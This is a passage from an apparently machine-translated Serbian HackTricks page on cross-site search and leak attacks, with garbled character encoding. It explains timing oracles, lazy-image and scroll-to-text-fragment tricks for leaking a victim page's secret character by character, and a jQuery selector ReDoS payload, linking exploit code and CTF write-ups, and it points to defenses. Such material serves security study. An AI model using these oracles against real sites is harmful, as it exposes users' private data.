U merenju izvrÅ¡avanja je moguÄ‡e **eliminisati** **mreÅ¾ne faktore** kako bi se dobile **preciznije merenja**. Na primer, uÄitavanjem resursa koriÅ¡Ä‡enih od strane stranice pre njenog uÄitavanja.
{% endhint %}

### Vreme dohvata

* **Metode ukljuÄivanja**: Fetch API
* **Detektibilna razlika**: Vreme (uglavnom zbog SadrÅ¾aja stranice, Statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **SaÅ¾etak:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvrÅ¡avanje zahteva. Mogu se koristiti i drugi Äasovnici.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Vreme preko prozora

* **Metode ukljuÄivanja**: IskaÄuÄ‡i prozori
* **Detektibilna razlika**: Vreme (uglavnom zbog SadrÅ¾aja stranice, Statusnog koda)
* **ViÅ¡e informacija**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **SaÅ¾etak:** Koristite [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) da izmerite vreme potrebno za izvrÅ¡avanje zahteva koristeÄ‡i `window.open`. Mogu se koristiti i drugi Äasovnici.
* **Primer koda**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=xs-search) da lako kreirate i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Pristupite danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}

## Sa HTML-om ili Re Injekcijom

Ovde moÅ¾ete pronaÄ‡i tehnike za eksfiltraciju informacija sa razliÄitog HTML **ubacivanjem HTML sadrÅ¾aja**. Ove tehnike su interesantne u sluÄajevima kada iz bilo kog razloga moÅ¾ete **ubaciti HTML ali ne moÅ¾ete ubaciti JS kod**.

### ViseÄ‡i Markup

{% content-ref url="../dangling-markup-html-scriptless-injection/" %}
[dangling-markup-html-scriptless-injection](../dangling-markup-html-scriptless-injection/)
{% endcontent-ref %}

### UÄitavanje slika u pozadini

Ako trebate **eksfiltrirati sadrÅ¾aj** i moÅ¾ete **dodati HTML pre tajnog sadrÅ¾aja** trebalo bi da proverite **uobiÄajene tehnike viseÄ‡eg markupa**.\
MeÄ‘utim, ako iz bilo kog razloga **MORATE** to uraditi **po karakter po karakter** (moÅ¾da je komunikacija putem pogotka keÅ¡a) moÅ¾ete koristiti ovu prevaru.

**Slike** u HTML-u imaju atribut "**loading**" Äija vrednost moÅ¾e biti "**lenjo**". U tom sluÄaju, slika Ä‡e se uÄitati kada bude prikazana, a ne dok se stranica uÄitava:
```html
<img src=/something loading=lazy >
```
Dakle, ono Å¡to moÅ¾ete uraditi je da **dodate puno beskorisnih znakova** (Na primer **hiljade "W" znakova**) da **popunite web stranicu pre tajnog sadrÅ¾aja ili dodate neÅ¡to poput** `<br><canvas height="1850px"></canvas><br>.`\
Zatim, ako na primer naÅ¡ **injekcija se pojavi pre zastave**, **slika** Ä‡e biti **uÄitana**, ali ako se pojavi **nakon** **zastave**, zastava + beskorisni znakovi Ä‡e **spreÄiti uÄitavanje** (morate igrati se sa koliÄinom beskorisnih znakova koje treba postaviti). To se desilo u [**ovom writeup-u**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Druga opcija bi bila da koristite **scroll-to-text-fragment** ako je dozvoljeno:

#### Scroll-to-text-fragment

MeÄ‘utim, moÅ¾ete **omoguÄ‡iti botu pristup stranici** sa neÄim poput
```
#:~:text=SECR
```
Tako Ä‡e web stranica izgledati neÅ¡to poput: **`https://victim.com/post.html#:~:text=SECR`**

Gde post.html sadrÅ¾i napadaÄke smeÅ¡ne karaktere i slike koje se uÄitavaju lenjo, a zatim se dodaje tajna bota.

Ova tekst Ä‡e omoguÄ‡iti botu pristup bilo kom tekstu na stranici koji sadrÅ¾i tekst `SECR`. PoÅ¡to je taj tekst tajna i nalazi se **ispod slike**, slika Ä‡e se **uÄitati samo ako je pogodak taÄan**. Tako da imate svoj orakl da **izvuÄete tajnu karakter po karakter**.

Primer koda za iskoriÅ¡Ä‡avanje ovoga: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Vreme UÄitavanja Slike sa Lenjim UÄitavanjem

Ako nije **moguÄ‡e uÄitati spoljnu sliku** Å¡to bi moglo ukazati napadaÄu da je slika uÄitana, druga opcija bi bila da pokuÅ¡ate **viÅ¡e puta pogoditi karakter i meriti to**. Ako je slika uÄitana, svi zahtevi Ä‡e trajati duÅ¾e nego kada slika nije uÄitana. To je ono Å¡to je koriÅ¡Ä‡eno u [**reÅ¡enju ovog teksta**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **sumirano ovde:**

{% content-ref url="event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="../regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](../regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Ako se koristi `jQuery(location.hash)`, moguÄ‡e je otkriti putem vremena da li **postoji odreÄ‘eni HTML sadrÅ¾aj**, to je zato Å¡to ako se selektor `main[id='site-main']` ne podudara, ne mora da proverava ostale **selektore**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### CSS Injection

{% content-ref url="css-injection/" %}
[css-injection](css-injection/)
{% endcontent-ref %}

## Odbrane

PreporuÄene su mere zaÅ¡tite u [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) takoÄ‘e u svakom odeljku wiki [https://xsleaks.dev/](https://xsleaks.dev/). Pogledajte tamo viÅ¡e informacija o tome kako se zaÅ¡tititi od ovih tehnika.

## Reference

* [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
* [https://xsleaks.dev/](https://xsleaks.dev)
* [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
* [https://xsinator.com/](https://xsinator.com/)
* [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)

<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) da lako izgradite i **automatizujete radne tokove** pokretane najnaprednijim alatima zajednice na svetu.\
Dobijte pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=xs-search" %}
